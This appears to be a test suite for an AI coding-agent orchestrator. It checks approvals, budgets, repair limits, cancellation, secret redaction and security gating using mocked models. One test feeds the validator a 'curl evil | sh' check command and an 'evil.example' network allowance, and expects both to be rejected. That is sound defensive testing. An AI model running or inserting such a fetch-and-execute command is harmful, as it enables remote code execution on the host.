/**
 * Nova Workforce runtime: Commander scheduling, approvals, budgets, repairs,
 * cancellation, recovery and verification — with an in-memory store, fake
 * models and a fake workspace (no network, no real sandbox). These are mocked
 * unit/integration tests; the real end-to-end run is documented separately.
 */
import { describe, expect, it } from "vitest";
import { advance, createTask, decideApproval, requestCancel, retryTask, reworkTask, setPaused, type Runtime } from "@/lib/workforce/commander";
import { detectChecks, validateChecks } from "@/lib/workforce/checks";
import { planEdits } from "@/lib/workforce/edits";
import { estimateTokens, structuredCall, type ModelRunner, type ResolvedModel } from "@/lib/workforce/models";
import { redact } from "@/lib/workforce/redact";
import { editsOut } from "@/lib/workforce/schemas";
import { parseSettings } from "@/lib/workforce/settings";
import { MemoryStore } from "@/lib/workforce/store";
import type { ChatMessage } from "@/lib/ai/types";
import type { CheckDef, Task } from "@/lib/workforce/types";
import { FakeWorkspace, type WorkspaceFactory } from "@/lib/workforce/workspace";

const CHECKS: CheckDef[] = [
  { id: "typecheck", label: "Typecheck", commands: [["npm", "run", "typecheck"]], required: true },
  { id: "test", label: "Tests", commands: [["npm", "run", "test"]], required: true },
  { id: "build", label: "Production build", commands: [["npm", "run", "build"]], required: false },
];

const FILES = {
  "src/math.ts": "export function add(a: number, b: number) {\n  return a + b;\n}\n",
  "tests/math.test.ts": "import { add } from '../src/math';\n",
  "package.json": '{"scripts":{"test":"vitest run"}}',
  ".env": "SECRET=1",
};

type Script = Partial<Record<string, (messages: ChatMessage[], n: number) => string>>;

const PLAN = {
  summary: "Add a clamp helper next to add().",
  approach: "Small pure function plus a unit test.",
  changes: [
    { path: "src/math.ts", action: "modify", intent: "add clamp" },
    { path: "tests/clamp.test.ts", action: "create", intent: "test clamp" },
  ],
  tests: ["clamp bounds"],
  risks: [],
  acceptanceCriteria: ["clamp(n, min, max) is exported from src/math.ts"],
  risk: "low",
  outOfScope: [],
};
const EDITS = {
  edits: [
    { action: "replace", path: "src/math.ts", search: "  return a + b;\n}\n", replace: "  return a + b;\n}\n\nexport function clamp(n: number, min: number, max: number) {\n  return Math.min(max, Math.max(min, n));\n}\n" },
    { action: "write", path: "tests/clamp.test.ts", content: "import { clamp } from '../src/math';\n" },
  ],
  notes: "Added clamp.",
};
const REVIEW_OK = { recommendation: "approve", summary: "Looks right.", findings: [], criteria: [{ criterion: "clamp(n, min, max) is exported from src/math.ts", status: "met", evidence: "diff adds export" }] };

const defaults: Script = {
  archaeologist: () => JSON.stringify({ summary: "math helpers live in src/math.ts", relevantFiles: [{ path: "src/math.ts", why: "add() lives here" }], existing: ["add()"], conventions: ["named exports"] }),
  architect: () => JSON.stringify(PLAN),
  builder: () => JSON.stringify(EDITS),
  self_heal: () => JSON.stringify({ rootCause: "missing export", edits: [{ action: "replace", path: "src/math.ts", search: "export function clamp", replace: "export function clamp" }], notes: "" }),
  reviewer: () => JSON.stringify(REVIEW_OK),
  sentinel: () => JSON.stringify({ findings: [] }),
};

class FakeModels implements ModelRunner {
  calls: { purpose: string; messages: ChatMessage[] }[] = [];
  counts: Record<string, number> = {};
  price: { in: number | null; out: number | null } = { in: 1, out: 2 };
  simulated = false;
  constructor(public script: Script = {}) {}
  async resolve(choice: string): Promise<ResolvedModel> {
    return { id: `fake:${choice}`, displayName: `Fake ${choice}`, provider: "fake", inputPrice: this.price.in, outputPrice: this.price.out, simulated: this.simulated };
  }
  async generate(_m: ResolvedModel, messages: ChatMessage[], opts: { purpose: string }) {
    this.calls.push({ purpose: opts.purpose, messages });
    const n = (this.counts[opts.purpose] = (this.counts[opts.purpose] ?? 0) + 1);
    const fn = this.script[opts.purpose] ?? defaults[opts.purpose];
    if (!fn) throw new Error(`no script for ${opts.purpose}`);
    const text = fn(messages, n);
    return { text, inputTokens: estimateTokens(messages), outputTokens: estimateTokens(text), estimated: false };
  }
}

function setup(o: { script?: Script; settings?: Record<string, unknown>; files?: Record<string, string> } = {}) {
  const store = new MemoryStore();
  store.settings = parseSettings({ maxAutonomy: "execute", ...o.settings });
  const models = new FakeModels(o.script);
  const spaces = new Map<string, FakeWorkspace>();
  let current: FakeWorkspace | null = null;
  const workspaces = Object.assign(
    (name: string) => {
      if (!spaces.has(name)) {
        const ws = new FakeWorkspace(name, o.files ?? FILES);
        if (current) ws.script = current.script; // recreated workspaces keep the scripted checks
        if (current?.evaluate) ws.evaluate = current.evaluate;
        spaces.set(name, ws);
        current = ws;
      }
      return spaces.get(name)!;
    },
    { available: () => ({ ok: true as const }) },
  ) as WorkspaceFactory;
  const rt: Runtime = { store, models, workspaces };
  const ws = (): FakeWorkspace => (current as FakeWorkspace | null) ?? (workspaces("wf-boot") as FakeWorkspace);
  return { rt, store, models, spaces, ws, workspaces };
}

async function project(store: MemoryStore) {
  return store.createProject({ name: "Demo", repo: "acme/demo", branch: "main", package_manager: "npm", checks: CHECKS, notes: null });
}

async function run(rt: Runtime, id: string, stop: Task["status"][] = ["awaiting_approval", "completed", "failed", "cancelled", "needs_attention", "blocked"], max = 30) {
  let t = (await rt.store.getTask(id))!;
  for (let i = 0; i < max; i++) {
    const r = await advance(rt, id, { budgetMs: 200_000 });
    t = r.task;
    if (stop.includes(t.status)) return t;
  }
  return t;
}

async function approvePlan(rt: Runtime, id: string) {
  const a = (await rt.store.listApprovals({ taskId: id, status: "pending" })).find((x) => x.kind === "plan")!;
  await decideApproval(rt, a.id, "approved", null, a.payload_hash);
}

async function newTask(rt: Runtime, store: MemoryStore, over: Partial<Parameters<typeof createTask>[1]> = {}) {
  const p = await project(store);
  return createTask(rt, { projectId: p.id, title: "Add clamp", objective: "Add a `clamp` helper to src/math.ts with a test.", acceptanceCriteria: ["clamp(n, min, max) is exported from src/math.ts"], priority: "medium", autonomy: "collaborate", ...over });
}

describe("Commander: end-to-end workflow (mocked models and workspace)", () => {
  it("analyses, waits for plan approval, builds, tests, reviews and verifies", async () => {
    const { rt, store, ws } = setup();
    const task = await newTask(rt, store);
    let t = await run(rt, task.id);
    expect(t.status).toBe("awaiting_approval");
    expect(t.plan?.changes).toHaveLength(2);
    const steps1 = await store.listSteps(task.id);
    expect(steps1.find((s) => s.key === "baseline")?.status).toBe("succeeded"); // ran in parallel with planning
    expect(steps1.some((s) => s.key === "build")).toBe(false); // nothing is built before approval

    await approvePlan(rt, task.id);
    t = await run(rt, task.id);
    expect(t.status).toBe("completed");
    expect(t.verification?.verdict).toBe("verified");
    expect(t.changed_files.sort()).toEqual(["src/math.ts", "tests/clamp.test.ts"]);
    expect(ws().files.get("src/math.ts")).toContain("export function clamp");
    expect(t.report).toContain("Checks that actually ran");
    expect(t.report).toContain("| test-1 | Tests | passed | 0 |");
    expect(t.report).toContain("Nothing has been pushed, merged or deployed");
    const keys = (await store.listSteps(task.id)).map((s) => `${s.key}:${s.status}`);
    expect(keys).toEqual(expect.arrayContaining(["prepare:succeeded", "map:succeeded", "plan:succeeded", "gate-plan:succeeded", "build:succeeded", "test-1:succeeded", "security:succeeded", "review:succeeded", "buildcheck:succeeded", "verify:succeeded"]));
    expect(ws().stopped).toBe(true);
    expect(t.spent_usd).toBeGreaterThan(0);
    expect((await store.listMemory(t.project_id))[0]).toMatchObject({ kind: "project_knowledge", verified: true });
    expect(store.events.filter((e) => e.level === "audit").map((e) => e.type)).toEqual(expect.arrayContaining(["task.created", "approval.requested", "approval.approved", "verification", "task.finished"]));
  });

  it("orders steps by dependency: build waits for the baseline and the approved plan", async () => {
    const { rt, store, ws } = setup({ settings: {} });
    const task = await newTask(rt, store);
    ws().script.typecheck = [{ exitCode: 0, output: "ok", pending: 3 }];
    await run(rt, task.id);
    const steps = await store.listSteps(task.id);
    const build = steps.find((s) => s.key === "build");
    expect(build).toBeUndefined();
    await approvePlan(rt, task.id);
    await advance(rt, task.id);
    const after = await store.listSteps(task.id);
    expect(after.find((s) => s.key === "build")?.depends_on).toEqual(["gate-plan", "baseline"]);
  });

  it("repairs a failing check and re-runs it", async () => {
    const { rt, store, ws } = setup();
    const task = await newTask(rt, store);
    ws().script.test = [
      { exitCode: 0, output: "baseline ok" },
      { exitCode: 1, output: "FAIL tests/clamp.test.ts\nError: clamp is not a function" },
      { exitCode: 0, output: "all passed" },
    ];
    await run(rt, task.id);
    await approvePlan(rt, task.id);
    const t = await run(rt, task.id);
    const keys = (await store.listSteps(task.id)).map((s) => s.key);
    expect(keys).toEqual(expect.arrayContaining(["test-1", "repair-1", "test-2"]));
    expect(t.status).toBe("completed");
    expect(t.report).toMatch(/repair-1: succeeded — root cause: missing export/);
  });

  it("never reports failing checks as passed, and stops repairing when the same failure repeats", async () => {
    const { rt, store, ws } = setup();
    const task = await newTask(rt, store);
    ws().script.test = [{ exitCode: 0, output: "baseline ok" }, { exitCode: 1, output: "Error: boom" }];
    await run(rt, task.id);
    await approvePlan(rt, task.id);
    const t = await run(rt, task.id);
    const steps = await store.listSteps(task.id);
    expect(steps.filter((s) => s.key.startsWith("repair-"))).toHaveLength(1);
    expect(store.events.some((e) => e.type === "repair.stopped" && /same failure/.test(e.message))).toBe(true);
    expect(t.status).toBe("needs_attention");
    expect(t.verification?.verdict).toBe("not_verified");
    expect(t.verification?.reasons.join(" ")).toMatch(/Tests failed \(exit 1\)/);
    expect(t.report).toContain("⚠️ Not verified");
    expect(t.report).not.toMatch(/\| test-2 \| Tests \| passed/);
  });

  it("respects the repair limit", async () => {
    const { rt, store, ws } = setup({ settings: { maxRepairAttempts: 1 } });
    const task = await newTask(rt, store);
    ws().script.test = [{ exitCode: 0, output: "ok" }, { exitCode: 1, output: "Error: one" }, { exitCode: 1, output: "Error: two" }, { exitCode: 1, output: "Error: three" }];
    await run(rt, task.id);
    await approvePlan(rt, task.id);
    const t = await run(rt, task.id);
    expect((await store.listSteps(task.id)).filter((s) => s.key.startsWith("repair-"))).toHaveLength(1);
    expect(t.status).toBe("needs_attention");
  });

  it("separates pre-existing failures from new ones", async () => {
    const { rt, store, ws } = setup();
    const task = await newTask(rt, store);
    ws().script.typecheck = [{ exitCode: 2, output: "error TS2304 pre-existing" }];
    await run(rt, task.id);
    await approvePlan(rt, task.id);
    const t = await run(rt, task.id);
    const test1 = (await store.listSteps(task.id)).find((s) => s.key === "test-1")!.output as { newFailures: string[]; preexisting: string[] };
    expect(test1).toMatchObject({ newFailures: [], preexisting: ["typecheck"] });
    expect(t.status).toBe("needs_attention"); // still not verified: a required check fails
  });

  it("Assist mode plans only and changes nothing", async () => {
    const { rt, store, ws } = setup();
    const task = await newTask(rt, store, { autonomy: "assist" });
    const t = await run(rt, task.id);
    expect(t.status).toBe("completed");
    expect(t.report).toContain("Analysis only");
    expect((await store.listSteps(task.id)).map((s) => s.key)).toEqual(["prepare", "map", "plan"]);
    expect(ws().files.get("src/math.ts")).toBe(FILES["src/math.ts"]);
  });

  it("Execute mode auto-approves low-risk plans but still asks for high-risk ones", async () => {
    const low = setup();
    const t1 = await newTask(low.rt, low.store, { autonomy: "execute" });
    expect((await run(low.rt, t1.id)).status).toBe("completed");
    expect(low.store.events.some((e) => e.type === "approval.auto")).toBe(true);

    const high = setup({ script: { architect: () => JSON.stringify({ ...PLAN, changes: [{ path: "src/math.ts", action: "modify", intent: "x" }, { path: "src/auth-helpers.ts", action: "create", intent: "y" }] }) } });
    const t2 = await newTask(high.rt, high.store, { autonomy: "execute" });
    const r2 = await run(high.rt, t2.id);
    expect(r2.status).toBe("awaiting_approval");
    expect(r2.plan?.risk).toBe("high");
  });

  it("refuses autonomy above the configured maximum", async () => {
    const { rt, store } = setup({ settings: { maxAutonomy: "collaborate" } });
    await expect(newTask(rt, store, { autonomy: "execute" })).rejects.toThrow(/above the allowed maximum/);
  });
});

describe("Commander: limits, approvals and control", () => {
  it("blocks before exceeding the budget and continues after the operator raises it", async () => {
    const { rt, store } = setup();
    const task = await newTask(rt, store, { budgetUsd: 0.0001 });
    let t = await run(rt, task.id);
    expect(t.status).toBe("needs_attention");
    expect(t.status_reason).toMatch(/exceed the task budget/);
    expect(t.spent_usd).toBe(0); // nothing was spent past the limit
    const a = (await store.listApprovals({ taskId: task.id, status: "pending" })).find((x) => x.kind === "budget")!;
    await decideApproval(rt, a.id, "approved", null, a.payload_hash);
    store.tasks[0]!.budget_usd = 5; // the approval raises it; make room for the rest of the test
    t = await run(rt, task.id);
    expect(t.status).toBe("awaiting_approval");
  });

  it("enforces the token budget", async () => {
    const { rt, store } = setup();
    const task = await newTask(rt, store, { tokenBudget: 1000 });
    const t = await run(rt, task.id);
    expect(t.status).toBe("needs_attention");
    expect(t.status_reason).toMatch(/token budget/);
  });

  it("won't use models without a known price unless the operator allows it", async () => {
    const a = setup();
    a.models.price = { in: null, out: null };
    const t = await newTask(a.rt, a.store);
    expect((await run(a.rt, t.id)).status_reason).toMatch(/no known price/);
    const b = setup({ settings: { allowUnpricedModels: true } });
    b.models.price = { in: null, out: null };
    const t2 = await newTask(b.rt, b.store);
    const r = await run(b.rt, t2.id);
    expect(r.status).toBe("awaiting_approval");
    expect(r.spent_unpriced_calls).toBeGreaterThan(0);
  });

  it("blocks when only a demo model is available instead of pretending", async () => {
    const { rt, store, models } = setup();
    models.simulated = true;
    const t = await newTask(rt, store);
    expect((await run(rt, t.id)).status_reason).toMatch(/No real AI model/);
  });

  it("validates outputs and lets the model correct itself once", async () => {
    const { rt, store, models } = setup({ script: { architect: (_m, n) => (n === 1 ? "not json at all" : JSON.stringify(PLAN)) } });
    const t = await newTask(rt, store);
    expect((await run(rt, t.id)).status).toBe("awaiting_approval");
    expect(models.counts.architect).toBe(2);
    expect(models.calls.filter((c) => c.purpose === "architect")[1]!.messages.at(-1)!.content).toMatch(/rejected/);
  });

  it("fails the task after bounded retries of persistently invalid output", async () => {
    const { rt, store, models } = setup({ script: { architect: () => "{}" } });
    const t = await newTask(rt, store);
    const r = await run(rt, t.id);
    expect(r.status).toBe("failed");
    expect(models.counts.architect).toBe(4); // 2 attempts × (call + one correction)
    expect(r.status_reason).toMatch(/Nova Architect failed/);
  });

  it("rejects plans that touch protected files and edits outside the plan", async () => {
    const plan = setup({ script: { architect: (_m, n) => JSON.stringify(n === 1 ? { ...PLAN, changes: [{ path: ".env", action: "modify", intent: "x" }] } : PLAN) } });
    const t = await newTask(plan.rt, plan.store);
    expect((await run(plan.rt, t.id)).status).toBe("awaiting_approval");
    expect(plan.models.calls.filter((c) => c.purpose === "architect")[1]!.messages.at(-1)!.content).toMatch(/environment files/);

    const r = planEdits([{ action: "write", path: "src/other.ts", content: "x" }], new Map(), { allowed: new Set(["src/math.ts"]), existing: new Set(), allowDependencyChanges: false });
    expect(r.ok).toBe(false);
    const dep = planEdits([{ action: "replace", path: "package.json", search: "a", replace: "b" }], new Map([["package.json", "a"]]), { allowed: new Set(["package.json"]), existing: new Set(["package.json"]), allowDependencyChanges: false });
    expect(dep.ok).toBe(false);
  });

  it("rejects stale approvals and approvals for a different plan", async () => {
    const { rt, store } = setup();
    const t = await newTask(rt, store);
    await run(rt, t.id);
    const a = (await store.listApprovals({ taskId: t.id }))[0]!;
    await expect(decideApproval(rt, a.id, "approved", null, "tampered-hash")).rejects.toThrow(/changed since you viewed it/);
    await decideApproval(rt, a.id, "approved", null, a.payload_hash);
    await expect(decideApproval(rt, a.id, "approved", null, a.payload_hash)).rejects.toThrow(/already approved/);
  });

  it("re-plans when a plan is rejected with feedback, and cancels when rejected without", async () => {
    const one = setup();
    const t = await newTask(one.rt, one.store);
    await run(one.rt, t.id);
    const a = (await one.store.listApprovals({ taskId: t.id }))[0]!;
    await decideApproval(one.rt, a.id, "rejected", "Put clamp in a new file instead", a.payload_hash);
    await run(one.rt, t.id);
    expect(one.models.calls.filter((c) => c.purpose === "architect").at(-1)!.messages.at(-1)!.content).toMatch(/Put clamp in a new file/);

    const two = setup();
    const t2 = await newTask(two.rt, two.store);
    await run(two.rt, t2.id);
    const a2 = (await two.store.listApprovals({ taskId: t2.id }))[0]!;
    await decideApproval(two.rt, a2.id, "rejected", null, a2.payload_hash);
    expect((await run(two.rt, t2.id)).status).toBe("cancelled");
  });

  it("cancels running work: kills the check, stops the workspace and runs nothing else", async () => {
    const { rt, store, ws, models } = setup();
    const t = await newTask(rt, store);
    ws().script.typecheck = [{ exitCode: 0, output: "ok", pending: 50 }];
    await advance(rt, t.id, { budgetMs: 20_000 });
    await requestCancel(rt, t.id);
    const after = (await store.getTask(t.id))!;
    expect(after.status).toBe("cancelled");
    expect(ws().killed.length).toBeGreaterThan(0);
    expect(ws().stopped).toBe(true);
    const callsBefore = models.calls.length;
    await advance(rt, t.id);
    expect(models.calls.length).toBe(callsBefore);
    expect((await store.listSteps(t.id)).every((s) => s.status !== "running" && s.status !== "pending")).toBe(true);
  });

  it("holds new assignments for a disabled agent and resumes after Retry", async () => {
    const { rt, store, ws } = setup({ settings: { disabledAgents: ["architect"] } });
    const t = await newTask(rt, store);
    const r = await run(rt, t.id);
    expect(r.status).toBe("needs_attention");
    expect(r.status_reason).toMatch(/Nova Architect is disabled/);
    store.settings = parseSettings({ maxAutonomy: "execute" });
    const first = ws();
    expect(first.stopped).toBe(false);
    await retryTask(rt, t.id);
    // The retry recreates the workspace, so the one kept alive while blocked must be stopped.
    expect(first.stopped).toBe(true);
    expect((await run(rt, t.id)).status).toBe("awaiting_approval");
  });

  it("restarts steps that were mid-run when a failed task is retried later", async () => {
    let planOk = false;
    const { rt, store, ws } = setup({ script: { architect: () => (planOk ? JSON.stringify(PLAN) : "{}") } });
    const t = await newTask(rt, store);
    ws().script.typecheck = [{ exitCode: 0, output: "ok", pending: 1000 }, { exitCode: 0, output: "ok" }];
    expect((await run(rt, t.id)).status).toBe("failed");
    const baseline = (await store.listSteps(t.id)).find((s) => s.key === "baseline")!;
    expect(baseline.status).toBe("running");
    // The operator retries a day later: the old start time must not count against the new run.
    await store.updateStep(baseline.id, { started_at: new Date(Date.now() - 86_400_000).toISOString() });
    planOk = true;
    await retryTask(rt, t.id);
    const r = await run(rt, t.id);
    expect(r.status).toBe("awaiting_approval");
    expect((await store.listSteps(t.id)).find((s) => s.key === "baseline")!.status).not.toBe("failed");
  });

  it("won't accept an approval for a finished task, and Retry voids open requests", async () => {
    const { rt, store } = setup();
    const t = await newTask(rt, store);
    await run(rt, t.id);
    const old = (await store.listApprovals({ taskId: t.id, status: "pending" }))[0]!;
    const baseline = (await store.listSteps(t.id)).find((s) => s.key === "baseline")!;
    await store.updateStep(baseline.id, { status: "failed", error: "boom" });
    await store.updateTask(t.id, { status: "failed" });
    await expect(decideApproval(rt, old.id, "approved", null, old.payload_hash)).rejects.toThrow(/retry it/);
    expect((await store.listApprovals({ taskId: t.id }))[0]!.status).toBe("expired");
    await retryTask(rt, t.id);
    expect((await run(rt, t.id)).status).toBe("awaiting_approval");
    expect((await store.listApprovals({ taskId: t.id, status: "pending" })).length).toBe(1);
  });

  it("does nothing while the emergency stop is on, or while paused", async () => {
    const { rt, store, models } = setup({ settings: { emergencyStop: true } });
    const t = await newTask(rt, store);
    const r = await advance(rt, t.id);
    expect(r.note).toMatch(/Emergency stop/);
    expect(models.calls).toHaveLength(0);
    store.settings = parseSettings({ maxAutonomy: "execute" });
    await advance(rt, t.id, { budgetMs: 10_000 });
    await setPaused(rt, t.id, true);
    const n = models.calls.length;
    await advance(rt, t.id);
    expect(models.calls.length).toBe(n);
    await setPaused(rt, t.id, false);
    expect((await run(rt, t.id)).status).toBe("awaiting_approval");
  });

  it("never lets two workers advance the same task", async () => {
    const { rt, store } = setup();
    const t = await newTask(rt, store);
    await store.acquireLease(t.id, "other-worker", 60_000);
    const r = await advance(rt, t.id);
    expect(r.note).toMatch(/Another worker/);
    expect(r.ran).toEqual([]);
  });

  it("queues tasks beyond the concurrency limit", async () => {
    const { rt, store } = setup({ settings: { maxConcurrentTasks: 1 } });
    const a = await newTask(rt, store);
    const p = (await store.listProjects())[0]!;
    const b = await createTask(rt, { projectId: p.id, title: "B", objective: "Another objective here", acceptanceCriteria: [], priority: "low", autonomy: "collaborate" });
    await advance(rt, a.id, { budgetMs: 10_000 });
    const r = await advance(rt, b.id);
    expect(r.note).toMatch(/Queued/);
    expect(r.task.status).toBe("created");
  });

  it("recovers a lost workspace by recreating it with the changes so far", async () => {
    const { rt, store, ws, spaces } = setup();
    const t = await newTask(rt, store);
    ws().script.test = [{ exitCode: 0, output: "ok" }, { exitCode: 0, output: "ok", pending: 2 }];
    await run(rt, t.id);
    await approvePlan(rt, t.id);
    await advance(rt, t.id, { budgetMs: 200_000 }); // builds, then starts tests that are still running
    expect((await store.listSteps(t.id)).find((s) => s.key === "build")?.status).toBe("succeeded");
    ws().lost = true;
    const r = await run(rt, t.id);
    expect(store.events.some((e) => e.type === "workspace.lost")).toBe(true);
    const recreated = [...spaces.entries()].find(([name]) => name.endsWith("-2"));
    expect(recreated?.[1].restored).toContain("clamp");
    expect(r.status).toBe("completed");
  });

  it("sends a change back for rework with the review feedback", async () => {
    const { rt, store, models } = setup({ script: { reviewer: (_m, n) => JSON.stringify(n === 1 ? { ...REVIEW_OK, recommendation: "request_changes", findings: [{ severity: "medium", issue: "Missing NaN handling", evidence: "" }] } : REVIEW_OK) } });
    const t = await newTask(rt, store);
    await run(rt, t.id);
    await approvePlan(rt, t.id);
    expect((await run(rt, t.id)).status).toBe("needs_attention");
    models.script.builder = () => JSON.stringify({ edits: [{ action: "replace", path: "src/math.ts", search: "return Math.min(max, Math.max(min, n));", replace: "return Number.isNaN(n) ? min : Math.min(max, Math.max(min, n));" }], notes: "NaN" });
    await reworkTask(rt, t.id, "Handle NaN");
    const r = await run(rt, t.id);
    expect(r.status_reason ?? "").toBe("Verified: all required checks, the review and the security gate passed.");
    expect(r.status).toBe("completed");
    expect(models.calls.filter((c) => c.purpose === "builder").at(-1)!.messages.at(-1)!.content).toMatch(/Missing NaN handling/);
  });

  it("blocks delivery on security findings at the configured threshold", async () => {
    const { rt, store } = setup({
      settings: { blockOnSecurity: "high" },
      script: { sentinel: () => JSON.stringify({ findings: [{ severity: "high", file: "src/math.ts", quote: "export function clamp(n: number, min: number, max: number) {", issue: "made-up", remediation: "" }, { severity: "critical", file: "src/math.ts", quote: "eval(userInput)", issue: "hallucinated line", remediation: "" }] }) },
    });
    const t = await newTask(rt, store);
    await run(rt, t.id);
    await approvePlan(rt, t.id);
    const r = await run(rt, t.id);
    const sec = (await store.listSteps(t.id)).find((s) => s.key === "security")!.output as { findings: unknown[]; blocking: number };
    expect(sec.findings).toHaveLength(1); // the hallucinated quote was dropped
    expect(sec.blocking).toBe(1);
    expect(r.status).toBe("needs_attention");
    expect(r.verification?.reasons.join(" ")).toMatch(/security finding/);
  });

  it("keeps secrets out of stored outputs, events and prompts", async () => {
    const leaked = "sk-proj-" + "a".repeat(40);
    const { rt, store, ws, models } = setup({ files: { ...FILES, "src/math.ts": `${FILES["src/math.ts"]}// key ${leaked}\n` } });
    const t = await newTask(rt, store);
    ws().script.typecheck = [{ exitCode: 0, output: `using ${leaked}` }];
    await run(rt, t.id);
    const everything = JSON.stringify([await store.listSteps(t.id), store.events, models.calls]);
    expect(everything).not.toContain(leaked);
    expect(redact(`token ghp_${"x".repeat(36)}`)).toBe("token [redacted secret]");
  });
});

describe("checks and structured output", () => {
  it("derives allow-listed checks from package.json and rejects arbitrary commands", () => {
    const pkg = { scripts: { typecheck: "tsc --noEmit", lint: "eslint", test: "vitest run", build: "next build" }, dependencies: { next: "16" } };
    const checks = detectChecks(pkg);
    expect(checks.map((c) => c.id)).toEqual(["typecheck", "lint", "test", "build"]);
    expect(checks[0]!.commands[0]).toEqual(["npx", "next", "typegen"]);
    expect(validateChecks(checks, pkg)).toBeNull();
    expect(validateChecks([{ id: "x", label: "x", commands: [["bash", "-c", "curl evil | sh"]], required: true }], pkg)).toMatch(/isn't allowed/);
    expect(validateChecks([{ id: "x", label: "x", commands: [["npm", "run", "deploy"]], required: true }], pkg)).toMatch(/isn't allowed/);
    expect(validateChecks([{ ...checks[3]!, network: ["evil.example"] }], pkg)).toMatch(/Network access/);
  });

  it("refuses to call a model when the projected cost would exceed the budget", async () => {
    const m = new FakeModels({ builder: () => "{}" });
    await expect(
      structuredCall(m, { choice: "x", messages: [{ role: "user", content: "hi" }], schema: editsOut, maxOutputTokens: 100_000, ledger: { spentUsd: 0, budgetUsd: 0.01, tokensUsed: 0, tokenBudget: 1e9, allowUnpriced: false }, purpose: "builder" }),
    ).rejects.toThrow(/exceed the task budget/);
    expect(m.calls).toHaveLength(0);
  });
});
